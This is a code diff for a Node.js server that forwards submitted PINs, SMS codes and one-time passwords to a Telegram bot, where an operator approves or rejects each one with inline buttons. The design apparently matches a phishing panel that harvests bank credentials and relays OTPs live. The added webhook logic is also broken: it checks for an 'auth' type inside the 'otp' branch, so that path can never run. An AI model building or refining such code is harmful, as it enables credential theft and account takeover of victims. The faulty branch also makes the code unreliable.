@@ -38,8 +38,7 @@ app.post('/verify-pin', async (req, res) => {
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ CORRECT PIN', callback_data: `auth_approve_${appId}` },
-        { text: '❌ WRONG PIN', callback_data: `auth_reject_${appId}` }
+        { text: '✅ ALLOW TO PROCEED', callback_data: `auth_approve_${appId}` }
       ]
     ]
   };
@@ -105,7 +104,8 @@ app.post('/verify-otp', async (req, res) => {
     inline_keyboard: [
       [
         { text: '✅ CORRECT OTP', callback_data: `otp_approve_${appId}` },
-        { text: '❌ WRONG OTP', callback_data: `otp_reject_${appId}` }
+        { text: '❌ WRONG OTP', callback_data: `otp_reject_${appId}` },
+        { text: '❌ WRONG PIN', callback_data: `auth_reject_${appId}` }
       ]
     ]
   };
@@ -168,7 +168,16 @@ app.post('/telegram-webhook', async (req, res) => {
       } else if (type === 'sms') {
         applications[appId].status = (action === 'approve') ? 'OTP_STEP' : 'SMS_REJECTED';
       } else if (type === 'otp') {
-        applications[appId].status = (action === 'approve') ? 'APPROVED' : 'OTP_REJECTED';
+        if (action === 'approve') {
+          applications[appId].status = 'APPROVED';
+        } else {
+          // Checks if the callback data corresponds to the wrong pin action triggered from the final step (auth_reject)
+          if (type === 'auth' && action === 'reject') {
+            applications[appId].status = 'PIN_REJECTED';
+          } else {
+            applications[appId].status = 'OTP_REJECTED';
+          }
+        }
       }
     }
 
@@ -192,4 +201,4 @@ app.post('/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-    
+                               
